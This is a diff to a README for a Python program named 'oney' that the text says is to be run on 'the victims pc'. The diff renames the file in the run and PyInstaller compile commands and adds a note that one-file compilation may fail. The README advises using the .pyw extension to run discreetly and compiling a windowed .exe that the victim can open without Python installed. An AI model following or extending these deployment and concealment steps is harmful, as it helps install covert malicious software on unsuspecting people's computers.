@@ -46,13 +46,13 @@ Requirements
 ```
 pip install -r requirements.txt
 
-python oney.pyw
+python oney.py
 ```
 File extension can be modified to:
 ```
 .py for console logs. (you need the requirements installed on the victims pc.)
 
-.pyw discrete. (you need the requirements installed on the victims pc.)
+.pyw discrete. (you need the requirements installed on the victims pc, compilation in onefile might not work.)
 
 .exe if you compile it with pyinstaller. (Recommended! no requirements or python needed, just an .exe file ready to be opened.)
 ```
@@ -152,9 +152,9 @@ Edit python file:
 ```
 pip install pyinstaller
 
-pyinstaller --onefile --windowed oney.pyw
+pyinstaller --onefile --windowed oney.py
 
-# you can add --icon=assets/icon.ico before oney.pyw for a custom icon.
+# you can add --icon=assets/icon.ico before oney.py for a custom icon.
 ```
 This will generate a .exe file in the dist folder ready to be opened by the victim, no requirements or python needed to open it.
 
